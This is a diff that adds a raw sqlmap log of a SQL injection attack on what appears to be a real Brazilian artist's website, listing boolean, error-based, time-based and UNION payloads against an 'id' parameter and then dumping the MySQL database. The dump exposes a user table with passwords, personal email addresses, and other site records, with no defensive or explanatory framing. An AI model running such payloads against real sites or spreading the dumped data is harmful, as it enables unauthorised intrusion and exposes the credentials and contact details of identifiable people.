@@ -1,0 +1,404 @@
+sqlmap identified the following injection point(s) with a total of 54 HTTP(s) requests:
+---
+Parameter: ace{id} (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: act{6}&ace{id}=13 AND 7753=7753
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: act{6}&ace{id}=13 AND (SELECT 6741 FROM(SELECT COUNT(*),CONCAT(0x7176626a71,(SELECT (ELT(6741=6741,1))),0x71627a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: act{6}&ace{id}=13 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: act{6}&ace{id}=-1144 UNION ALL SELECT NULL,NULL,CONCAT(0x7176626a71,0x506a4d5259787a6a5444586a6d41686a7157514d724d7354514a466e626f4c555a6248455a554a57,0x71627a6a71),NULL,NULL-- nCWu
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] information_schema
+[*] mysql_101
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: ace{id} (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: act{6}&ace{id}=13 AND 7753=7753
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: act{6}&ace{id}=13 AND (SELECT 6741 FROM(SELECT COUNT(*),CONCAT(0x7176626a71,(SELECT (ELT(6741=6741,1))),0x71627a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: act{6}&ace{id}=13 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: act{6}&ace{id}=-1144 UNION ALL SELECT NULL,NULL,CONCAT(0x7176626a71,0x506a4d5259787a6a5444586a6d41686a7157514d724d7354514a466e626f4c555a6248455a554a57,0x71627a6a71),NULL,NULL-- nCWu
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: mysql_101
+[26 tables]
++---------+
+| ace     |
+| ate     |
+| cnt     |
+| cri     |
+| ema     |
+| est     |
+| exp     |
+| mid     |
+| mun     |
+| per     |
+| pes     |
+| pes_ema |
+| pes_tel |
+| pre     |
+| pub     |
+| son     |
+| tel     |
+| tpa     |
+| tpe     |
+| tpm     |
+| tpp     |
+| tpr     |
+| tpt     |
+| tpu     |
+| usu     |
+| usu_per |
++---------+
+
+Database: mysql_101
++---------+---------+
+| Table   | Entries |
++---------+---------+
+| mun     | 5569    |
+| usu_per | 111     |
+| exp     | 60      |
+| per     | 56      |
+| est     | 28      |
+| mid     | 20      |
+| ace     | 17      |
+| cnt     | 7       |
+| pes     | 7       |
+| pes_tel | 7       |
+| pub     | 7       |
+| tel     | 5       |
+| tpr     | 5       |
+| tpt     | 4       |
+| tpu     | 4       |
+| ema     | 3       |
+| pes_ema | 3       |
+| son     | 3       |
+| tpe     | 3       |
+| tpm     | 3       |
+| tpp     | 3       |
+| cri     | 2       |
+| pre     | 2       |
+| tpa     | 2       |
+| usu     | 2       |
+| ate     | 1       |
++---------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: ace{id} (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: act{6}&ace{id}=13 AND 7753=7753
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: act{6}&ace{id}=13 AND (SELECT 6741 FROM(SELECT COUNT(*),CONCAT(0x7176626a71,(SELECT (ELT(6741=6741,1))),0x71627a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: act{6}&ace{id}=13 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: act{6}&ace{id}=-1144 UNION ALL SELECT NULL,NULL,CONCAT(0x7176626a71,0x506a4d5259787a6a5444586a6d41686a7157514d724d7354514a466e626f4c555a6248455a554a57,0x71627a6a71),NULL,NULL-- nCWu
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: mysql_101
+Table: usu
+[2 entries]
++----+--------+----------+
+| id | id_pes | senha    |
++----+--------+----------+
+| 1  | 2      | 12345678 |
+| 3  | 3      | 12345678 |
++----+--------+----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: ace{id} (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: act{6}&ace{id}=13 AND 7753=7753
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: act{6}&ace{id}=13 AND (SELECT 6741 FROM(SELECT COUNT(*),CONCAT(0x7176626a71,(SELECT (ELT(6741=6741,1))),0x71627a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: act{6}&ace{id}=13 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: act{6}&ace{id}=-1144 UNION ALL SELECT NULL,NULL,CONCAT(0x7176626a71,0x506a4d5259787a6a5444586a6d41686a7157514d724d7354514a466e626f4c555a6248455a554a57,0x71627a6a71),NULL,NULL-- nCWu
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: mysql_101
+[26 tables]
++---------+
+| ace     |
+| ate     |
+| cnt     |
+| cri     |
+| ema     |
+| est     |
+| exp     |
+| mid     |
+| mun     |
+| per     |
+| pes     |
+| pes_ema |
+| pes_tel |
+| pre     |
+| pub     |
+| son     |
+| tel     |
+| tpa     |
+| tpe     |
+| tpm     |
+| tpp     |
+| tpr     |
+| tpt     |
+| tpu     |
+| usu     |
+| usu_per |
++---------+
+
+Database: mysql_101
++---------+---------+
+| Table   | Entries |
++---------+---------+
+| mun     | 5569    |
+| usu_per | 111     |
+| exp     | 60      |
+| per     | 56      |
+| est     | 28      |
+| mid     | 20      |
+| ace     | 17      |
+| cnt     | 7       |
+| pes     | 7       |
+| pes_tel | 7       |
+| pub     | 7       |
+| tel     | 5       |
+| tpr     | 5       |
+| tpt     | 4       |
+| tpu     | 4       |
+| ema     | 3       |
+| pes_ema | 3       |
+| son     | 3       |
+| tpe     | 3       |
+| tpm     | 3       |
+| tpp     | 3       |
+| cri     | 2       |
+| pre     | 2       |
+| tpa     | 2       |
+| usu     | 2       |
+| ate     | 1       |
++---------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: ace{id} (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: act{6}&ace{id}=13 AND 7753=7753
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: act{6}&ace{id}=13 AND (SELECT 6741 FROM(SELECT COUNT(*),CONCAT(0x7176626a71,(SELECT (ELT(6741=6741,1))),0x71627a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: act{6}&ace{id}=13 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: act{6}&ace{id}=-1144 UNION ALL SELECT NULL,NULL,CONCAT(0x7176626a71,0x506a4d5259787a6a5444586a6d41686a7157514d724d7354514a466e626f4c555a6248455a554a57,0x71627a6a71),NULL,NULL-- nCWu
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: mysql_101
+[26 tables]
++---------+
+| ace     |
+| ate     |
+| cnt     |
+| cri     |
+| ema     |
+| est     |
+| exp     |
+| mid     |
+| mun     |
+| per     |
+| pes     |
+| pes_ema |
+| pes_tel |
+| pre     |
+| pub     |
+| son     |
+| tel     |
+| tpa     |
+| tpe     |
+| tpm     |
+| tpp     |
+| tpr     |
+| tpt     |
+| tpu     |
+| usu     |
+| usu_per |
++---------+
+
+Database: mysql_101
+Table: ace
+[17 entries]
++------------+
+| data       |
++------------+
+| 2009-03-01 |
+| 2009-08-03 |
+| 2009-09-03 |
+| 2010-09-03 |
+| 2010-10-03 |
+| 2011-03-03 |
+| 2011-05-03 |
+| 2012-03-03 |
+| 2012-09-03 |
+| 2012-10-03 |
+| 2015-10-03 |
+| 2016-03-03 |
+| 2018-03-08 |
+| 2018-07-05 |
+| 2018-07-05 |
+| 2018-07-05 |
+| 2018-07-05 |
++------------+
+
+Database: mysql_101
+Table: ate
+[1 entry]
++----+--------+
+| id | id_pes |
++----+--------+
+| 1  | 3      |
++----+--------+
+
+Database: mysql_101
+Table: cnt
+[7 entries]
++---------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| htm     | txt                                                                                                                                                                                                                                                                              |
++---------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| <blank> | Maria das Dores Pontes Marques (Dôia), nascida na cidade de Tupaciguara-MG em 1956, radicou-se em Goiânia-GO desde 1976 onde graduou-se em Artes Visuais (1981) e Licenciatura em desenho e plástica (1985) pelo Instituto de Artes (IA) da Universidade Federal de Goiás (UFG). |
+| <blank> | Seja bem-vindo ao meu site oficial, sou Dôia, pintora                                                                                                                                                                                                                            |
+| <blank> | Desejando                                                                                                                                                                                                                                                                        |
+| <blank> | Ao longo de minha carreira inúmeras foram as exposições ...                                                                                                                                                                                                                      |
+| <blank> | Minhas obras, distribuídas por acervos públicos e particulares, podem ser agora conhecidas e apreciadas aqui.                                                                                                                                                                    |
+| <blank> | Premiada em concursos variados ...                                                                                                                                                                                                                                               |
+| <blank> | Sua obra já foi referenciada em algumas publicações especializadas, dentre elas:                                                                                                                                                                                                 |
++---------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+
+Database: mysql_101
+Table: cri
+[2 entries]
++-----------------------+
+| txt                   |
++-----------------------+
+| Testando 1, 2, 3, ... |
+| Testando 1, 2, 3, ... |
++-----------------------+
+
+Database: mysql_101
+Table: ema
+[3 entries]
++----+----------------------+
+| id | nome                 |
++----+----------------------+
+| 1  | ednardo@lobosnet.com |
+| 9  | madoia@bol.com.br    |
+| 10 | leart@kelps.com.br   |
++----+----------------------+
+
+Database: mysql_101
+Table: est
+[18 entries]
++----+---------+------------+
+| id | cod     | nome       |
++----+---------+------------+
+| 1  | <blank> | <blank>    |
+| 2  | AC      | Acre       |
+| 3  | AL      | Alagoas    |
+| 4  | AM      | Amazonas   |
+| 5  | AP      | Amapá      |
+| 6  | BA      | Bahia      |
+| 7  | CE      | Ceará      |
+| 10 | GO      | Goiás      |
+| 11 | MA      | Maranhão   |
+| 15 | PA      | Pará       |
+| 16 | PB      | Paraíba    |
+| 17 | PE      | Pernambuco |
+| 18 | PI      | Piauí      |
+| 19 | PR      | Paraná     |
+| 22 | RO      | Rondônia   |
+| 23 | RR      | Roraima    |
+| 26 | SE      | Sergipe    |
+| 28 | TO      | Tocantins  |
++----+---------+------------+
+
+Database: mysql_101
+Table: exp
+[4 entries]
++------------+------------+
+| data_i     | data_f     |
++------------+------------+
+| 2018-03-06 | 0000-00-00 |
+| 1998-00-00 | 0000-00-00 |
+| 1997-00-00 | 0000-00-00 |
+| 0000-00-00 |
++------------+------------+
+
